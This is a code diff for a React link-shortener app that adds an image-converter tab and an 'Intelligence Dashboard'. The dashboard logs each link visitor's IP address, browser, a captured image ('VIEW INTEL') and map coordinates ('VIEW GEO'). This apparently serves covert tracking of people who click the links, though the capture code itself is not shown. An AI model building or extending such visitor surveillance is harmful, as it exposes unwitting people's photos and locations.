@@ -1,9 +1,10 @@
 import React, { useState, useEffect } from 'react';
 import { supabase } from '../lib/supabase';
 import { generateShortCode, cn } from '../lib/utils';
-import { Link2, Copy, Check, Sparkles, Settings2, Database, AlertCircle, Trash2, Lock, Edit2, X, Download, QrCode, BarChart3, Clock, Smartphone, Monitor, Globe, ArrowUpRight, ExternalLink, ChevronDown, Plus, History } from 'lucide-react';
+import { Link2, Copy, Check, Sparkles, Settings2, Database, AlertCircle, Trash2, Lock, Edit2, X, Download, QrCode, BarChart3, Clock, Smartphone, Monitor, Globe, ArrowUpRight, ExternalLink, ChevronDown, Plus, History, Camera, ArrowRight, RefreshCw } from 'lucide-react';
 import { SocialIcon } from '../components/SocialIcon';
 import { QRCodeSVG } from 'qrcode.react';
+import { ImageConverter } from '../components/ImageConverter';
 
 const SOCIAL_ICONS = [
   { id: 'link', label: 'Default' },
@@ -79,7 +80,7 @@ export default function Home() {
 
   const [deferredPrompt, setDeferredPrompt] = useState<any>(null);
   const [isInstalled, setIsInstalled] = useState(false);
-  const [mobileTab, setMobileTab] = useState<'create' | 'recent'>('create');
+  const [mobileTab, setMobileTab] = useState<'create' | 'recent' | 'media' | 'analytics'>('create');
   const resultRef = React.useRef<HTMLDivElement>(null);
 
   useEffect(() => {
@@ -143,6 +144,12 @@ export default function Home() {
       return [];
     }
   });
+
+  useEffect(() => {
+    if (mobileTab === 'analytics' && !analyticsLink && history.length > 0) {
+      fetchAnalytics(history[0]);
+    }
+  }, [mobileTab, history, analyticsLink]);
 
   const handleEditClick = async (code: string) => {
     try {
@@ -399,6 +406,10 @@ export default function Home() {
 
   const fetchAnalytics = async (link: any) => {
     setAnalyticsLink(link);
+    // Switch to analytics tab on mobile when a link is clicked
+    if (window.innerWidth < 768) {
+       setMobileTab('analytics');
+    }
     setIsLoadingAnalytics(true);
     setAnalyticsData([]);
     try {
@@ -784,20 +795,160 @@ VITE_SUPABASE_ANON_KEY="sb_publishable_iecSD9eU8wwGFllUWzmZng_yYam5hag"
         {/* Main Content Area */}
         <main className={cn(
           "flex-1 flex flex-col items-center justify-center p-4 md:p-20 bg-[radial-gradient(circle_at_top,_#1a1a1a_0%,_#0a0a0a_70%)] overflow-y-auto",
-          mobileTab === 'create' ? "flex" : "hidden md:flex"
+          (mobileTab === 'create' || mobileTab === 'media' || mobileTab === 'analytics') ? "flex" : "hidden md:flex"
         )}>
-          <div className="w-full max-w-2xl mt-4 md:mt-0 mb-auto">
-            <div className="mb-6 md:mb-10 text-center">
-              <h1 className="text-3xl md:text-4xl font-light tracking-tight mb-2">
-                Simplify your <span className="font-medium text-blue-500">Links</span>.
-              </h1>
-              <p className="text-sm text-zinc-500">Paste a long URL and get a short link instantly.</p>
-            </div>
+          {mobileTab === 'media' ? (
+            <ImageConverter />
+          ) : mobileTab === 'analytics' ? (
+            <div className="w-full max-w-5xl animate-in fade-in slide-in-from-bottom-4 duration-500">
+               {!analyticsLink ? (
+                  <div className="space-y-8">
+                     <div className="text-center md:text-left">
+                        <h2 className="text-3xl font-light tracking-tight text-white mb-2">Link Analytics</h2>
+                        <p className="text-xs text-zinc-500 uppercase tracking-[0.2em] font-bold">Select a link to view intelligence data</p>
+                     </div>
 
-            <div className="flex flex-col gap-6">
-              {/* Shortener Tool Form */}
-              <div className="bg-zinc-900/50 border border-white/10 p-6 md:p-8 rounded-[32px] backdrop-blur-xl shadow-2xl">
-              <form onSubmit={handleSubmit} className="space-y-6">
+                     <div className="grid grid-cols-1 gap-4">
+                        {history.map((link: any) => (
+                           <button 
+                             key={link.id || link.code}
+                             onClick={() => fetchAnalytics(link)}
+                             className="w-full text-left bg-white/[0.03] hover:bg-white/[0.06] border border-white/[0.05] hover:border-blue-500/30 p-5 rounded-[24px] transition-all flex items-center justify-between group"
+                           >
+                              <div className="flex items-center gap-5 min-w-0">
+                                 <div className="w-12 h-12 bg-blue-500/10 rounded-2xl flex items-center justify-center shrink-0 group-hover:bg-blue-500/20 transition-colors">
+                                    <BarChart3 className="w-5 h-5 text-blue-400" />
+                                 </div>
+                                 <div className="min-w-0">
+                                    <h4 className="text-sm font-medium text-white mb-0.5 truncate">{link.longUrl.replace(/^https?:\/\//, '')}</h4>
+                                    <p className="text-[10px] text-zinc-500 font-bold uppercase tracking-widest flex items-center gap-2">
+                                       SHORT CODE: <span className="text-blue-400">/{link.code}</span>
+                                    </p>
+                                 </div>
+                              </div>
+                              <div className="flex items-center gap-4 shrink-0">
+                                 <div className="hidden sm:block text-right">
+                                    <p className="text-lg font-light text-white leading-none">{link.clicks || 0}</p>
+                                    <p className="text-[8px] text-zinc-600 font-bold uppercase tracking-widest mt-1">Total Clicks</p>
+                                 </div>
+                                 <ArrowRight className="w-4 h-4 text-zinc-700 group-hover:text-blue-500 transform group-hover:translate-x-1 transition-all" />
+                              </div>
+                           </button>
+                        ))}
+                        {history.length === 0 && (
+                           <div className="text-center py-20 bg-white/[0.01] rounded-[32px] border border-dashed border-white/10">
+                              <Link2 className="w-12 h-12 text-zinc-800 mx-auto mb-4" />
+                              <p className="text-zinc-600 text-xs uppercase tracking-widest font-bold">No links created yet</p>
+                           </div>
+                        )}
+                     </div>
+                  </div>
+               ) : (
+                  <div className="space-y-6">
+                     <div className="flex items-center justify-between mb-8">
+                        <div>
+                           <h2 className="text-2xl font-light tracking-tight text-white mb-1">Intelligence Dashboard</h2>
+                           <p className="text-xs text-zinc-500 font-bold uppercase tracking-widest flex items-center gap-2">
+                              Tracking <span className="text-blue-400 font-mono">/{analyticsLink.code}</span>
+                           </p>
+                        </div>
+                        <div className="flex items-center gap-3">
+                           <button 
+                             onClick={() => setAnalyticsLink(null)}
+                             className="hidden md:flex items-center gap-2 px-3 py-1.5 bg-white/5 hover:bg-white/10 text-zinc-400 rounded-lg text-[10px] font-bold uppercase tracking-widest transition-all"
+                           >
+                              <RefreshCw className="w-3 h-3" />
+                              Switch Link
+                           </button>
+                           <button 
+                             onClick={() => setAnalyticsLink(null)}
+                             className="p-2 bg-white/5 hover:bg-white/10 text-zinc-400 rounded-full md:hidden"
+                           >
+                              <X className="w-5 h-5"/>
+                           </button>
+                        </div>
+                     </div>
+
+                     {isLoadingAnalytics ? (
+                        <div className="h-64 flex flex-col items-center justify-center gap-4">
+                           <div className="w-8 h-8 border-2 border-blue-500/20 border-t-blue-500 rounded-full animate-spin" />
+                           <p className="text-[10px] text-zinc-600 font-bold uppercase tracking-widest">Collecting Data...</p>
+                        </div>
+                     ) : (
+                        <div className="space-y-6">
+                           <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
+                              {[
+                                { label: 'Clicks', val: analyticsData.length, icon: ArrowUpRight, color: 'text-blue-400' },
+                                { label: 'Uniques', val: new Set(analyticsData.map(d => d.ip_address)).size, icon: Globe, color: 'text-emerald-400' },
+                                { label: 'Browser', val: analyticsData.length > 0 ? Object.entries(analyticsData.reduce((acc, obj) => ({...acc, [obj.browser]: (acc[obj.browser] || 0) + 1}), {} as any)).sort((a: any, b: any) => b[1] - a[1])[0][0] : 'N/A', icon: Monitor, color: 'text-orange-400' },
+                                { label: 'Intel', val: analyticsData.filter(d => d.captured_image).length, icon: Camera, color: 'text-purple-400' }
+                              ].map((stat, i) => (
+                                <div key={i} className="bg-white/[0.03] border border-white/[0.05] p-5 rounded-2xl">
+                                   <stat.icon className={cn("w-5 h-5 mb-3", stat.color)} />
+                                   <p className="text-xl font-light text-white mb-1">{stat.val}</p>
+                                   <p className="text-[9px] text-zinc-600 font-bold uppercase tracking-widest">{stat.label}</p>
+                                </div>
+                              ))}
+                           </div>
+
+                           <div className="bg-white/[0.02] border border-white/[0.04] rounded-2xl overflow-hidden">
+                              <div className="p-4 border-b border-white/5 bg-white/[0.02] flex justify-between items-center">
+                                 <h4 className="text-[10px] font-bold text-zinc-500 uppercase tracking-[0.2em]">Live Traffic Log</h4>
+                              </div>
+                              <div className="divide-y divide-white/[0.03] max-h-[600px] overflow-y-auto custom-scrollbar">
+                                 {analyticsData.map((log, i) => (
+                                   <div key={i} className="p-4 hover:bg-white/[0.02] transition-colors">
+                                      <div className="flex items-center justify-between mb-2">
+                                         <span className="text-xs font-mono text-zinc-400">{log.ip_address}</span>
+                                         <span className="text-[9px] text-zinc-600 font-bold">{new Date(log.created_at).toLocaleTimeString()}</span>
+                                      </div>
+                                      <div className="flex flex-wrap gap-2">
+                                         <span className="text-[9px] px-1.5 py-0.5 bg-white/5 rounded text-zinc-500 border border-white/5">{log.browser}</span>
+                                         <span className="text-[9px] px-1.5 py-0.5 bg-white/5 rounded text-zinc-500 border border-white/5">{log.os || 'OS'}</span>
+                                         {log.captured_image && (
+                                            <button 
+                                              onClick={() => setSelectedImage(log.captured_image)}
+                                              className="text-[9px] px-1.5 py-0.5 bg-blue-500/10 rounded text-blue-400 border border-blue-500/20 font-bold"
+                                            >
+                                               VIEW INTEL
+                                            </button>
+                                         )}
+                                         {log.latitude && (
+                                            <a 
+                                              href={`https://www.google.com/maps?q=${log.latitude},${log.longitude}`}
+                                              target="_blank"
+                                              rel="noreferrer"
+                                              className="text-[9px] px-1.5 py-0.5 bg-emerald-500/10 rounded text-emerald-400 border border-emerald-500/20 font-bold"
+                                            >
+                                               VIEW GEO
+                                            </a>
+                                         )}
+                                      </div>
+                                   </div>
+                                 ))}
+                                 {analyticsData.length === 0 && (
+                                    <div className="p-8 text-center text-zinc-600 italic text-xs">No activity log found.</div>
+                                 )}
+                              </div>
+                           </div>
+                        </div>
+                     )}
+                  </div>
+               )}
+            </div>
+          ) : (
+            <div className="w-full max-w-2xl mt-4 md:mt-0 mb-auto">
+              <div className="mb-6 md:mb-10 text-center">
+                <h1 className="text-3xl md:text-4xl font-light tracking-tight mb-2">
+                  Simplify your <span className="font-medium text-blue-500">Links</span>.
+                </h1>
+                <p className="text-sm text-zinc-500">Paste a long URL and get a short link instantly.</p>
+              </div>
+
+              <div className="flex flex-col gap-6">
+                {/* Shortener Tool Form */}
+                <div className="bg-zinc-900/50 border border-white/10 p-6 md:p-8 rounded-[32px] backdrop-blur-xl shadow-2xl">
+                  <form onSubmit={handleSubmit} className="space-y-6">
                 <div>
                   <label htmlFor="url" className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest mb-2 block">
                     Destination URL
@@ -1116,7 +1267,7 @@ VITE_SUPABASE_ANON_KEY="sb_publishable_iecSD9eU8wwGFllUWzmZng_yYam5hag"
             </div>
 
             {/* Result Card - Moved back to bottom with auto-scroll */}
-            {shortUrl && (
+            {shortUrl && mobileTab === 'create' && (
               <div 
                 ref={resultRef}
                 className="bg-emerald-500/5 border border-emerald-500/20 p-4 md:p-6 rounded-2xl animate-in slide-in-from-bottom-8 duration-500 shadow-[0_0_40px_rgba(16,185,129,0.05)]"
@@ -1143,7 +1294,8 @@ VITE_SUPABASE_ANON_KEY="sb_publishable_iecSD9eU8wwGFllUWzmZng_yYam5hag"
             )}
           </div>
         </div>
-      </main>
+      )}
+    </main>
       </div>
 
       {/* Mobile Bottom Navigation */}
@@ -1159,9 +1311,39 @@ VITE_SUPABASE_ANON_KEY="sb_publishable_iecSD9eU8wwGFllUWzmZng_yYam5hag"
             "p-1 rounded-lg transition-all",
             mobileTab === 'create' ? "bg-blue-500/10" : ""
           )}>
-            <Plus className="w-6 h-6" />
+            <Plus className="w-5 h-5" />
           </div>
-          <span className="text-[10px] font-bold uppercase tracking-widest">Create</span>
+          <span className="text-[9px] font-bold uppercase tracking-widest">Links</span>
+        </button>
+        <button 
+          onClick={() => setMobileTab('media')}
+          className={cn(
+            "flex flex-col items-center gap-1 transition-all",
+            mobileTab === 'media' ? "text-blue-500" : "text-zinc-500"
+          )}
+        >
+          <div className={cn(
+            "p-1 rounded-lg transition-all",
+            mobileTab === 'media' ? "bg-blue-500/10" : ""
+          )}>
+            <Camera className="w-5 h-5" />
+          </div>
+          <span className="text-[9px] font-bold uppercase tracking-widest">Media</span>
+        </button>
+        <button 
+          onClick={() => setMobileTab('analytics')}
+          className={cn(
+            "flex flex-col items-center gap-1 transition-all",
+            mobileTab === 'analytics' ? "text-blue-500" : "text-zinc-500"
+          )}
+        >
+          <div className={cn(
+            "p-1 rounded-lg transition-all",
+            mobileTab === 'analytics' ? "bg-blue-500/10" : ""
+          )}>
+            <BarChart3 className="w-5 h-5" />
+          </div>
+          <span className="text-[9px] font-bold uppercase tracking-widest">Stats</span>
         </button>
         <button 
           onClick={() => setMobileTab('recent')}
@@ -1174,9 +1356,9 @@ VITE_SUPABASE_ANON_KEY="sb_publishable_iecSD9eU8wwGFllUWzmZng_yYam5hag"
             "p-1 rounded-lg transition-all",
             mobileTab === 'recent' ? "bg-blue-500/10" : ""
           )}>
-            <History className="w-6 h-6" />
+            <History className="w-5 h-5" />
           </div>
-          <span className="text-[10px] font-bold uppercase tracking-widest">Recent</span>
+          <span className="text-[9px] font-bold uppercase tracking-widest">Recent</span>
         </button>
       </div>
 
